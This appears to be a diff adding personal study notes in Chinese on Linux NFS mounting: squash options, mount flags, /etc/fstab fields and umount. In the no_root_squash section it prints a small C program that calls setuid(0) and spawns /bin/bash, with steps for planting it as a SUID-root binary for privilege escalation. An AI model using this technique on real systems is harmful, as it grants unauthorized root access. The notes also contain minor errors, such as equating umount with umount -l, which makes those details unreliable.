@@ -1,0 +1,123 @@
+零 基本概念
+（一）挂载的概念：我们说将A机器上的AA目录挂载到本地B机器上的B目录，B机器的用户可以通过访问BB目录访问到AA目录。
+在上例中，我们称AA目录为导出目录，BB目录为挂载目录或称挂载点。
+
+
+
+（二）下载安装nfs客户端：sudo apt install nfs-common
+虽然Linux自带mount命令，但是往往和现今的nfs版本不匹配，所以最好是下这个nfs-common
+
+
+
+（三）这里要强调：你放一个socket监听程序上去，谁运行，在谁的主机上监听，要明确nfs的概念啊。
+
+
+
+（四）关键理解：
+0 问题：任何挂载某个导出目录的用户都能访问该导出目录，那么问题来了，本地用户怎么看其他主机上的用户创建的文件？（或者说文件的属主和主组如何映射到本地？）
+
+1 答案：
+（1）root_squash（默认）：
+root -> nobody
+common -> common：这是什么意思？比如用户A创建了一个文件，搁A这ll，属主和主组肯定是A啊，但是搁B那ll就是B了。
+（2）no_root_squash（提权漏洞）：
+root -> root：这就有问题了，黑客可以挂载到共享目录上，放一个.c：
+#include <stdlib.h>
+#include <sys/types.h>
+#include <unistd.h>
+int main() {
+	setuid(0);
+	system("/bin/bash");
+	return 0;
+}
+生成的elf，并将改elf设置为root权限和SUID权限，这样，在黑客拿下这台NAS后，运行该elf即可完成lpe。
+common -> common
+（3）all_squash：
+所有用户 -> nobody
+
+
+
+
+
+
+
+一 mount
+（零）形式：mount [OPTION]... [nfs-server-ip-addr:export-dir-path] [MOUNTPOINT]
+
+
+
+（一）常用选项
+1 -t fstype:
+（1）功能：指定要挂载的文件系统类型。
+（2）fstype：ext4、nfs、vfat等。
+
+2 -o options:
+（1）功能：指定挂载选项，可以是多个，使用逗号分隔。
+（2）常见options包括：
+rw: 以读写方式挂载。
+ro: 以只读方式挂载。
+async: 异步写入。
+sync: 同步写入。
+user: 允许普通用户挂载。
+noexec: 不允许在该文件系统上执行任何二进制文件。
+auto：在启动时自动挂载。
+noauto：不自动挂载。
+nosuid: 不允许设置SUID或SGID位。
+remount: 重新挂载已挂载的文件系统。
+注意：你应该已经发现了有些命令用在命令行会比较奇怪，是的，
+user、auto、noauto只能在/etc/fstab（后续会讲）中使用。
+（3）-a:
+挂载/etc/fstab中定义的所有文件系统。
+（4）-r:
+以只读方式挂载。
+（5）-w:
+以读写方式挂载（默认行为）。
+（6）-v:
+显示详细信息，增加输出的详细程度。
+（7）-f:
+强制挂载，即使有错误也继续。
+（8）--bind:
+绑定挂载，将一个现有的目录重新挂载到另一个目录。相当于复制。
+（9）--move:
+移动一个已挂载的文件系统到新的挂载点。相当于剪切。
+测试结果：moving a mount residing under a shared mount is unsupported
+（10）权限选项（3个），详见关键理解。
+
+
+
+（二）/etc/fstype
+0 基本语法：<文件系统>  <挂载点>  <类型>  <选项>  <转储>  <检查>
+
+1 详解：
+（1）文件系统:
+可以是设备名称（如 /dev/sda1）、UUID（如 UUID=xxxx-xxxx）、LABEL（如 LABEL=mydisk）或网络地址（如 NFS 的 192.168.1.100:/share）。
+（2）挂载点:
+指定该文件系统将被挂载到的目录路径，如 /mnt/nfs_share。
+（3）类型:
+文件系统的类型，例如 ext4、nfs、vfat 等。
+（4）选项 :
+挂载选项，可以有多个，用逗号分隔。例如：
+defaults: 默认选项
+noauto: 不自动挂载
+user: 允许普通用户挂载
+rw: 可读可写
+ro: 只读
+bind: 绑定挂载
+其他如 async, sync, noexec, nosuid 等
+（5）转储 （备份导出目录）:
+一个整数值，表示是否需要备份，0 表示不备份，1 表示需要备份。
+（6）检查（就是fsck） :
+一个整数值，系统启动时用于检查文件系统的顺序，0 表示不检查，1 表示根文件系统，2 表示其他文件系统。
+
+
+
+
+
+
+
+二 umount
+0 功能：用来卸载。如果不umount，你是删不了挂载目录的，必须先卸载。
+
+1 形式：
+umount /mnt/mydrive == umount -l /mnt/mydrive：懒惰删除，不好用。
+umount -f /mnt/mydrive：强制删除，这个好用
